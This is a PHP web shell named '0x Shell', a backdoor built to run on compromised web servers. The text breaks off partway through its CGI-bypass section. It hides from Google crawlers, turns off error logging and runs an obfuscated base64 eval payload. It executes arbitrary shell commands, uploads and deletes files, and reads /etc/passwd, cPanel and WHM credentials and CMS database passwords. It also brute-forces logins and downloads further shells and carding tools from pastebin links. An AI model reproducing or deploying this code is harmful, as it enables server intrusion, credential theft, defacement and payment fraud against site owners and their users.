<?
// 0x1999 Private Shell
// Use your own risk
// Hard coded by 0x1999

// Start Bots Locked
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { header('HTTP/1.0 404 Not Found'); exit; }
// End //Bots Locked

// Start configuration
$shell_name = '0x Shell';
$shell_slogan = 'The Next JanCox Shell';
$shell_version = '1.1';
$shell_bypass_security = '0';
$show_error = "0"; 
@session_start(); 
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@set_time_limit(0); 
// @set_magic_quotes_runtime(0);
// End configuration

// start init
if($show_error == "0"){
	@error_reporting(0); 
	@error_log(0);
	@ini_set('error_log',NULL); 
	@ini_set('log_errors',0); 
	@ini_set('display_errors', 0);
} else {
	ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
	error_reporting(E_ALL);
}; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B')))));

if(!function_exists('posix_getegid')) {
  $user = @get_current_user();
  $uid = @getmyuid();
  $gid = @getmygid();
  $group = "?";
} else {
  $uid = @posix_getpwuid(posix_geteuid());
  $gid = @posix_getgrgid(posix_getegid());
  $user = $uid['name'];
  $uid = $uid['uid'];
  $group = $gid['name'];
  $gid = $gid['gid'];
}
if(@is_dir("/home/$user/public_html/")){
	$server_type = "public_html";
} elseif(@is_dir("/var/www/vhosts/")){
	$server_type = "vhost";
} else{
	$server_type = "unknown";
}

//end init

//start config list
$ext = array("v1","v2","v3","wp","WP","blog","client","clients","forum","forums","home","new","old","site","portal","test","demo","wordpress","joomla","beta","news","main","shop","mage","magento","sites","cms","secure","support","panel","public");
$configtype = array(
	"/wp-config.php" => "Wordpress",
	"/config/koneksi.php" => "Lokomedia",
	"/forum/config.php" => "phpBB",
	"/sites/default/settings.php" => "Drupal",
	"/config/settings.inc.php" => "PrestaShop",
	"/app/etc/local.xml" => "Magento",
	"/admin/config.php" => "OpenCart",
	"/application/config/database.php" => "Ellislab",
	"/configuration.php" => "Joomla",
	"/submitticket.php" => "WHMCS",
	"/config.php" => "OtherConfig",
	"/db.php" => "DB",
	"/db.inc.php" => "DBInc",
	"/database.php" => "Database",
	"/includes/config.php" => "Vbulletin",
	"/db/config.php" => "DBConfig"
 );
//end config list

//start head process
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
if(isset($_GET['dir']) && ($_GET['dir'] != "")){
	$dir = $_GET['dir'];
	chdir($_GET['dir']);
} else {
	$dir = getcwd();
}
if(isset($_POST['upload'])) {
  if(@copy($_FILES['0xfile']['tmp_name'], "$dir/".$_FILES['0xfile']['name']."")){
    $actx = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['0xfile']['name']."</b></i>";
  } else {
    $actx = "<font color=red>failed to upload file</font>";
  }
} else {
	$actx ="";
}
//end head process
?>
	<!DOCTYPE html>
	<html>
	<style stype="text/css">
		@import url(https://fonts.googleapis.com/css?family=Abel|Baumans);
		body {
			background: #101010;
			color: #f2f2f2;
			font-family: Abel;
			font-size: 12px;
		}

		body a {
			color: #3467BA;
			text-decoration: none;
		}

		body a:hover {
			text-decoration: underline;
		}

		#main_content {
			border: 1px solid #5C7296;
			overflow: hidden;
			width: 1000px;
			height: auto;
			padding: 15px;
			margin: 0 auto;
			background: #0A0A0A;
			border-radius: 6px;
			-moz-border-radius: 6px;
			-webkit-border-radius: 6px;
		}

		.enabled {
			color: #7ACC29;
		}

		.enabled a {
			color: #7ACC29;
			font-weight: normal;
		}

		.disabled {
			color: #CC0000;
		}

		.TableHeader_Name {
			width: 400px;
			padding: 0px 0px 0px 5px;
			height: 25px;
			font-family: Abel;
			background-color: #282828;
			border-top-left-radius: 4px;
			-moz-border-top-left-radius: 4px;
			-webkit-border-top-left-radius: 4px;
		}

		.TableHeader {
			width: 100px;
			height: 25px;
			font-family: Abel;
			text-align: center;
			background-color: #282828;
		}

		.TableHeaderoptions {
			padding: 0px 0px 0px 15px;
			width: 200px;
			height: 25px;
			font-family: Abel;
			background-color: #282828;
			border-top-right-radius: 4px;
			-moz-border-top-right-radius: 4px;
			-webkit-border-top-right-radius: 4px;
		}

		.TableLast {
			padding: 0px 0px 0px 15px;
			width: 200px;
			height: 25px;
			font-family: Abel;
			background-color: #282828;
			border-top-right-radius: 4px;
			-moz-border-top-right-radius: 4px;
			-webkit-border-top-right-radius: 4px;
		}

		.filesize {
			color: green;
			text-align: center;
		}

		.filenames a {
			font-weight: normal;
			text-decoration: none;
		}

		.filenames a:hover {
			text-decoration: underline;
		}

		.filetr {
			background-color: #080808;
		}

		.filetr:hover {
			background-color: #282828;
		}

		#options {
			font-weight: 200;
			font-family: Abel;
			margin-left: 10px;
			display: block;
		}

		#title {
			font-size: 25px;
			font-family: arial;
			display: block;
			padding: 15px 0px 0px 0px;
		}

		.box {
			padding: 10px;
			background-color: #292929;
			border: 1px solid #3467BA;
			height: auto;
			width: 970;
			border-radius: 6px;
			-moz-border-radius: 6px;
			-webkit-border-radius: 6px;
		}

		.sembunyi {
			display: none;
			padding: 0;
			margin: 0;
		}

		textarea {
			background-color: #010101;
			color: #f2f2f2;
			border: 1px solid #3467BA;
			outline: none;
			font-size: 11px;
			border-radius: 3px;
			-moz-border-radius: 3px;
			-webkit-border-radius: 3px;
			padding: 5px;
			width: 970px;
			height: 400px;
		}

		input[type=text],
		input[type=password],
		input[type=submit],
		input[type=button] {
			background: #010101;
			color: #f2f2f2;
			margin: 0 4px;
			border: 1px solid #3467BA;
			outline: none;
			font-size: 11px;
			border-radius: 3px;
			-moz-border-radius: 3px;
			-webkit-border-radius: 3px;
			font-family: Abel;
			font-size: 12px;
		}

		.viewfile {
			background: #EDECEB;
			color: #000000;
			margin: 4px 2px;
			padding: 8px;
			border-radius: 3px;
			-moz-border-radius: 3px;
			-webkit-border-radius: 3px;
			border: 1px solid #3467BA;
		}

		select {
			color: #f2f2f2;
			padding: 0;
			margin: 0;
			border: 1px solid #3467BA;
			outline: none;
			font-size: 11px;
			border-radius: 3px;
			-moz-border-radius: 3px;
			-webkit-border-radius: 3px;
			background: #010101;
			overflow: hidden;
			font-family: Abel;
			font-size: 12px;
		}

		input[type="file"] {
			color: #f2f2f2;
			padding: 0;
			margin: 0;
			border: 1px solid #3467BA;
			outline: none;
			font-size: 11px;
			border-radius: 3px;
			-moz-border-radius: 3px;
			-webkit-border-radius: 3px;
			background: #010101;
			overflow: hidden;
			font-family: Abel;
			font-size: 12px;
		}

		.ndelik {
			display: none;
			padding: 0;
			margin: 0;
		}

		form,
		table {
			/*display: inline;*/
			margin: 0px;
			padding: 0px;
		}
	</style>

	<script type="text/javascript">
		function tukar(lama, baru) {
			document.getElementById(lama).style.display = 'none';
			document.getElementById(baru).style.display = 'block';
		}
	</script>

	<link href="http://vignette2.wikia.nocookie.net/regularshow/images/f/fc/Emoticones_-_Pacman.png/revision/latest?cb=20160107170905&amp;path-prefix=es" rel="icon" type="image/x-icon">

	<?php

$ling ="http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create";
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<input type='text' name='searchterm' size='30'style='background-color: rgb(41, 41, 41);border: 1px solid rgb(41, 41, 41);height: 12px;color: red;width: 385px;'value='$ds'readonly/>" : "<font color=lime>NONE</font>";
echo "<title>$shell_name</title>";

if(isset($_GET['create'])){
	function CreateTools($names,$lokasi){
	if ( $_GET['create'] == $names ){
		$a= "".$_SERVER['SERVER_NAME']."";
$b= dirname($_SERVER['PHP_SELF']);
$c = "/0x1/".$names.".php";
if (file_exists('0x1/'.$names.'.php')){
	echo '<script type="text/javascript">alert("Done");window.location.href = "0x1/'.$names.'.php";</script> ';
	}
	else {mkdir("0x1", 0777);
file_put_contents('0x1/'.$names.'.php', file_get_contents($lokasi));
echo ' <script type="text/javascript">alert("Done");window.location.href = "0x1/'.$names.'.php";</script> ';}}
}
CreateTools("wso","http://pastebin.com/raw/3eh3Gej2");
CreateTools("adminer"."https://www.adminer.org/static/download/4.2.5/adminer-4.2.5.php");
CreateTools("b374k","http://pastebin.com/raw/rZiyaRGV");
CreateTools("injection","http://pastebin.com/raw/nxxL8c1f");
CreateTools("promailerv2","http://pastebin.com/raw/Rk9v6eSq");
CreateTools("gamestopceker","http://pastebin.com/raw/QSnw1JXV");
CreateTools("bukapalapak","http://pastebin.com/raw/6CB8krDi");
CreateTools("tokopedia","http://pastebin.com/dvhzWgby");
CreateTools("encodedecode","http://pastebin.com/raw/wqB3G5eZ");
CreateTools("mailer","http://pastebin.com/raw/9yu1DmJj");
CreateTools("r57","http://pastebin.com/raw/G2VEDunW");
CreateTools("tokenpp","http://pastebin.com/raw/72xgmtPL");
CreateTools("extractor","http://pastebin.com/raw/jQnMFHBL");
CreateTools("bh","http://pastebin.com/raw/3L2ESWeu");
CreateTools("dhanus","http://pastebin.com/raw/v4xGus6X");
}
	
//Start Function
function permissions($file){

$perms = @fileperms($file);
if (($perms & 0xC000) == 0xC000) {
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
$info = 'p';
} else {
$info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
function UrlLoop($url,$type){
  $urlArray = array();
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $result = curl_exec($ch);
  $regex='|<a.*?href="(.*?)"|';
  preg_match_all($regex,$result,$parts);
  $links = $parts[1];
  foreach($links as $link){
    array_push($urlArray, $link);
  }
  curl_close($ch);
  foreach($urlArray as $value){
    $lol = "$url$value";
    if(preg_match("#$type#is", $lol)) {
      echo "$lol\r\n";
    }
  }
}

function anucurl($sites) {
    $ch = curl_init($sites);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
          curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
          curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
          curl_setopt($ch, CURLOPT_COOKIESESSION,true);
    $data = curl_exec($ch);
          curl_close($ch);
    return $data;
}
function clearspace($text){
	return str_replace(" ","_",$text);
}	
function magicboom($text){
	if (!get_magic_quotes_gpc()) {
   		 return $text;
	} 
	return stripslashes($text);
}
function ambilKata($param, $kata1, $kata2){
  if(strpos($param, $kata1) === FALSE) return FALSE;
  if(strpos($param, $kata2) === FALSE) return FALSE;
  $start = strpos($param, $kata1) + strlen($kata1);
  $end = strpos($param, $kata2, $start);
  $return = substr($param, $start, $end - $start);
  return $return;
}
function ambil_password($link) {
  $pass = "";
  $ambil = file_get_contents($link);
  if(preg_match("/WordPress/", $ambil)) {
    $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
  } elseif(preg_match("/JConfig|joomla/", $ambil)) {
    $pass .= ambilkata($ambil,"password = '","'")."\n";
  } elseif(preg_match("/cmsmember/", $ambil)) {
    $pass .= ambilkata($ambil,'dbpasswd = "','"')."\n";
  } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
    $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
  } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
    $pass .= ambilkata($ambil,'password = "','"')."\n";
  } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
    $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
  } elseif(preg_match("/client/", $ambil)) {
    preg_match("/password=(.*)/", $ambil, $pass1);
    if(preg_match('/"/', $pass1[1])) {
      $pass1[1] = str_replace('"', "", $pass1[1]);
      $pass .= $pass1[1]."\n";
    }
  } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
    $pass .= ambilkata($ambil,"db_password = '","'")."\n";
  }
  return $pass;
}
function w($dir,$perm) {
  if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function cekjum($kentu){


	// $it = new RecursiveIteratorIterator($kentu,RecursiveDirectoryIterator::SKIP_DOTS);
	$it = new RecursiveIteratorIterator
	(
		new RecursiveDirectoryIterator($kentu)
	);
	// if($it-> DirectoryIterator::isDot()){
	// 	echo "cok";
	// }

	// $index = array_search('..',$it);
	// if($index !== FALSE){
	//     unset($it[$index]);
	// }


  foreach ($it as $filename) {
  	$file=realpath(dirname($filename));
	if($file == ".."){
		continue;
	}
    if (is_writable($filename)){

$perm = permissions($file);
$perm = w($file,$perm);
$permd = permissions($filename);
$permd = w($filename,$permd);

      if(is_dir($filename)){
      	if(is_writable($file)){
          echo "[ D ] [$perm]\t\t<a href='?dir=$file'>$file</a><font color='lime'>is writable</font><br>";
      	}
      }
        else {
        	if(is_writable($filename)){
          echo "[ F ] [$permd]\t\t<a href='?act=edit&dir=$file&file=$filename'>$filename</a><font color='lime'>is writable</font><br>";
        }
    }

      }
  }
}
function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}

//End Function

//start bypasser


// $etcpasswd = etcpasswd();

$etcpasswd = @file_get_contents('/etc/passwd');
if(!$etcpasswd){
	$etcpasswd = exe('cat /etc/passwd');
}        
// end bypasser



/////////////////////////////////////

$sport = $_SERVER['SERVER_PORT'];
$d0mains = @file("/etc/named.conf");
$users=@file('/etc/passwd');
if($d0mains){
  $count;
  foreach($d0mains as $d0main){
    if(@ereg("zone",$d0main)){
      preg_match_all('#zone "(.*)"#', $d0main, $domains);
      flush();
      if(strlen(trim($domains[1][0])) > 2){
        flush();
        $count++;
      }
    }
  }
  $count2=$count/2;
} else {
	$count2="??";
}
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
echo "
	<body>
	<div id='main_content'><span id='title'><font face='Baumans'>$shell_name</font> </span><i>$shell_slogan</i><br><br><div class='box'>
";
echo'
<table  cellspacing="0" cellpadding="0">
<colgroup>
<col style="width: 499px">
<col style="width: 599px">
</colgroup>
  <tr>
    <td nowrap>Server Name:'.php_uname().'</td>
<td align="right"><form><div class="select-style">
<select onchange="if (this.value) window.open(this.value);">
   <option selected="selected" value=""> <i>Tools Creator </option>
   <option value="'.$ling.'=wso"><i>WSO 2.8.1</option>
   <option value="'.$ling.'=injection"><i>1n73ction v3</option>
   <option value="'.$ling.'=wk">WHMCS Killer</option>
   <option value="'.$ling.'=adminer">Adminer</option>
   <option value="'.$ling.'=b374k">b374k Shell</option>
   <option value="'.$ling.'=b374k323">b374k 3.2</option>   
   <option value="'.$ling.'=bh">BlackHat Shell</option>      
   <option value="'.$ling.'=dhanus">Dhanush Shell</option>     
   <option value="'.$ling.'=r57">R57 Shell</option>    
<option value="'.$ling.'=encodedecode">Encode Decode</option>    
<option value="'.$ling.'=r57">R57 Shell</option>    
</select>
<select onchange="if (this.value) window.open(this.value);">
   <option selected="selected" value=""> Tools Carder </option>
   <option value="'.$ling.'=extractor">DB Email Extractor</option>
   <option value="'.$ling.'=promailerv2">Pro Mailer V2</option>     
   <option value="'.$ling.'=bukalapak">BukaLapak Checker</option>        
   <option value="'.$ling.'=tokopedia">TokoPedia Checker</option>  
   <option value="'.$ling.'=tokenpp">Paypal Token Generator</option>  
   <option value="'.$ling.'=mailer">Mailer</option>  
   <option value="'.$ling.'=gamestopceker">GamesTop Checker</option>
   </select></div>
<noscript><input type="submit" value="Submit"></noscript>
</form></td>
  </tr>
  <tr>
    <td>User :<font color=lime>'.$user.'</font> ('.$uid.') Group : <font color=lime>'.$group.'</font> ('.$gid.')</td>
    <td align="right">';
	if($server_type == "public_html"){
    if (file_exists('/home/'.$user.'/.my.cnf')){
      $cp = file_get_contents('/home/'.$user.'/.my.cnf');
		  $cp = ambilkata($cp,'password="','"');
      echo 'Cpanel : Username <font color="lime">(</font>'.$user.'<font color="lime">)</font> Password <font color="lime">(</font>'.$cp.'<font color="lime">)</font>';
    }}
    echo '
    </td>
    </tr>
    <tr>
    <td>Server IP :<font color=lime>'.gethostbyname($_SERVER["HTTP_HOST"]).'</font>  <span class="enabled"><a href="https://www.bing.com/search?q=IP:'.gethostbyname($_SERVER["HTTP_HOST"]).'" target="_blank">[BING]</a></span> <span class="enabled"><a href="https://centralops.net/co/domaindossier.aspx?addr='.gethostbyname($_SERVER["HTTP_HOST"]).'&dom_whois=true&dom_dns=true&traceroute=true&net_whois=true&svc_scan=true" target="_blank">[Dossier]</a></span> | Port : <font color=lime>'.$sport.'</font> | Your IP: <font color=lime>'.$_SERVER["REMOTE_ADDR"].'</font></td>
	<td align="right">';
  if($server_type == "public_html"){
	if (file_exists('/home/'.$user.'/.accesshash')){
    $whm = file_get_contents('/home/'.$user.'/.accesshash');
		$whm = preg_replace( '/\s+/' , '' , $whm );
		echo '<input type="text" size="30" value="WHM '.$user.':'.$whm.'">';
  } }
  echo '
  </td>
  </tr>
  <tr>
    <td>Server Type : '.$server_type.' | Website :<font color=lime> '.$count2.' </font> Domains</td>
  </tr>
  <tr>
    <td>Safe Mode: '.$sm.'</td>
  </tr>
  <tr>
    <td>Disable Functions:'.$show_ds.'</td>
  </tr>
  <tr>
    <td>Server Software: '.$_SERVER["SERVER_SOFTWARE"].' <span class="enabled"><a href="http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description='.$_SERVER["SERVER_SOFTWARE"].'&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=" target="_blank">[Exploit DB]</a></span>
	</td>
  </tr>
  <tr>
    <td>Directory : ';
	foreach($scdir as $c_dir => $cdir) {
    echo "<a href='?dir=";
    for($i = 0; $i <= $c_dir; $i++) {
        echo $scdir[$i];
        if($i != $c_dir) {
        echo "/";
        }
      }
    echo "'>$cdir</a>/";
  }
	echo"</td>
	<td align='right'><form method='post' enctype='multipart/form-data'><input type='file' name='0xfile'><input type='submit' value='upload' name='upload'></form></td>
  </tr>
  <tr>
    <td><form method='post' action='?dir=$dir&do=cmd' style='float: left;'>
    Command : 
    <input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
    </form><p></p>
	</td>
	<td align='right'>".$actx."</td>
  </tr>
</table></div>";
echo '<a href="?">Home</a> / ';
echo "<a href='?dir=".$dir."&do=config'>Config</a> / ";
echo "<a href='?dir=".$dir."&do=jump'>Jump</a> / ";
echo "<a href='?dir=".$dir."&do=symlink'>Sym</a> / ";
echo "<a href='?dir=".$dir."&do=cpanel'>Cpanel</a> / ";
echo "<a href='?dir=".$dir."&do=symlink'>Sym</a> / ";
echo "<a href='?dir=".$dir."&do=mass_deface'>Mass</a> / ";
echo "<a href='?dir=".$dir."&do=mirror'>Mirror</a> / ";
echo "<a href='?dir=".$dir."&do=cgi'>Cgi</a> / ";
echo "<a href='?dir=".$dir."&do=bc'>BC</a> / ";
echo "<a href='?dir=".$dir."&do=about'>About</a> / ";
echo "<a href='?dir=".$dir."&do=serverinfo'>Server Info</a> / ";
echo "<a href='?do=deleteme'>Self Remove</a> / ";
echo "<a href='?dir=".$dir."&do=ndelikne'>Hidden Shell</a> / ";
echo "<a href='?dir=".$dir."&do=crp'>Config ResPass</a> / ";
echo "<a href='?dir=".$dir."&do=grabpass'>Auto CU Joomla</a> / ";
echo "<a href='?dir=".$dir."&do=hek'>Deface</a> / ";
echo "<a href='?dir=".$dir."&do=cpres'>Cpanel Reset</a> / ";
echo '<hr>';	
/////////////////////////////////////
// if(isset($_GET['act']) && ($_GET['act'] == ''))



// START TOOLS SCRIPT
if(isset($_GET['act']) && ($_GET['act'] == 'delete')) {
    $delete = unlink($_GET['file']);
    if($delete) {
        $act = "<script>window.location='?dir=".$dir."';</script>";
    } else {
        $act = "<font color=red>permission denied</font>";
    }
    echo $act;
}

elseif(isset($_GET['act']) && ($_GET['act'] == 'delete_dir')) {
    function Delete($path)
{
  $path = (substr($path,-1)=='/') ? $path:$path.'/';
	$dh  = opendir($path);
  while ( ($item = readdir($dh) ) !== false) {
    $item = $path.$item;
    if ( (basename($item) == "..") || (basename($item) == ".") )
      continue;
    $type = filetype($item);
    if ($type == "dir")
      Delete($item);
    else
      @unlink($item);
  }
  closedir($dh);
  @rmdir($path);}
  $delete_dir = Delete($dir);
  $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
  echo $act;
}
elseif(isset($_POST['do_rename'])) {
  $rename = rename($_POST['oldname'], "$dir/".htmlspecialchars($_POST['rename'])."");
  if($rename) {
    $act = "<script>window.location='?dir=".$dir."';</script>";
  } else {
    $act = "<font color=red>permission denied</font>";
  }
  echo "".$act."<br>";
}
elseif(isset($_POST['dir_rename'])) {
  $dir_rename = rename($dir."/".$_POST['oldname'], "".$dir."/".htmlspecialchars($_POST['fol_rename'])."");
  if($dir_rename) {
    $act = "<script>window.location='?dir=".$dir."';</script>";
  } else {
    $act = "<font color=red>permission denied</font>";
  }
  echo "".$act."<br>";
}
elseif(isset($_GET['act']) && ($_GET['act'] == 'newfolder')) {
  if($_POST['new_save_folder']) {
    $new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
    if(!mkdir($new_folder)) {
      $act = "<font color=red>permission denied</font>";
    } else {
      $act = "<script>window.location='?dir=".$dir."';</script>";
    }
  }
  echo $act;
}
elseif(isset($_GET['act']) && ($_GET['act'] == 'view')) {
  if(is_file($_GET['file'])){ 
	if(!isset($file)) $file = magicboom($_GET['file']);
	echo "Filename : <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
		echo "<div class=\"viewfile\">";
		$file = wordwrap(@file_get_contents($file),"240","\n");
		@highlight_string($file);
		echo "</div>";
}elseif(is_dir($_GET['view'])){
  echo showdir($dir,$prompt);
}	
}


//end act

elseif(isset($_GET['do']) && ($_GET['do'] == 'cpanel')) {
  if($_POST['crack']) {
    $usercp = explode("\r\n", $_POST['user_cp']);
    $passcp = explode("\r\n", $_POST['pass_cp']);
    $i = 0;
    foreach($usercp as $ucp) {
      foreach($passcp as $pcp) {
        if(@mysql_connect('localhost', $ucp, $pcp)) {
          if($_SESSION[$ucp] && $_SESSION[$pcp]) {
          } else {
            $_SESSION[$ucp] = "1";
            $_SESSION[$pcp] = "1";
            $i++;
            echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
          }
        }
      }
      session_unset();
      session_destroy(); 
    }
    if($i == 0) {
    } else {
      echo "<br>Nemu ".$i." Cpanel by <font color=lime>0x1999</font>";
    }
  } else {
    echo "<center>
    <form method='post'>
    USER: <br>
    <textarea style='width: 450px; height: 150px;' name='user_cp'>";
    $_usercp = fopen("/etc/passwd","r");
    while($getu = fgets($_usercp)) {
      if($getu == '' || !$_usercp) {
        echo "<font color=red>Can't read /etc/passwd</font>";
      } else {
        preg_match_all("/(.*?):x:/", $getu, $u);
        foreach($u[1] as $user_cp) {
            if(is_dir("/home/$user_cp/public_html")) {
              echo "$user_cp\n";
          }
        }
      }
    }
    echo "</textarea><br>
    PASS: <br>
    <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
    function cp_pass($dir) {
      $pass = "";
      $dira = scandir($dir);
      foreach($dira as $dirb) {
        if(!is_file("$dir/$dirb")) continue;
        $ambil = file_get_contents("$dir/$dirb");
        if(preg_match("/WordPress/", $ambil)) {
          $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
        } elseif(preg_match("/JConfig|joomla/", $ambil)) {
          $pass .= ambilkata($ambil,"password = '","'")."\n";
        }

         elseif(preg_match("/konekDB/", $ambil)) {
          $pass .= ambilkata($ambil,"$password = '","'")."\n";
        }

         elseif(preg_match("/cmsmember/", $ambil)) {
          $pass .= ambilkata($ambil,'dbpasswd = "','"')."\n";
        } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
          $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
        } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
          $pass .= ambilkata($ambil,'password = "','"')."\n";
        } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
          $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
        } elseif(preg_match("/client/", $ambil)) {
          preg_match("/password=(.*)/", $ambil, $pass1);
          if(preg_match('/"/', $pass1[1])) {
            $pass1[1] = str_replace('"', "", $pass1[1]);
            $pass .= $pass1[1]."\n";
          }
        } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
          $pass .= ambilkata($ambil,"db_password = '","'")."\n";
        }
      }
      echo $pass;
    }
    $cp_pass = cp_pass($dir);
    echo $cp_pass;
    echo "</textarea><br>
    <input type='submit' name='crack' style='width: 450px;' value='Crack'>
    </form>
    <br></center>";
  }
}elseif(isset($_GET['do']) && ($_GET['do'] == 'cgi')) {
	echo "<center/><br/><b><font color=blue>+--==[ cgitelnet.v1  Bypass Exploit]==--+ </font></b><br><br>";
 mkdir('cgitelnet1', 0755);
    chdir('cgitelnet1');      
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
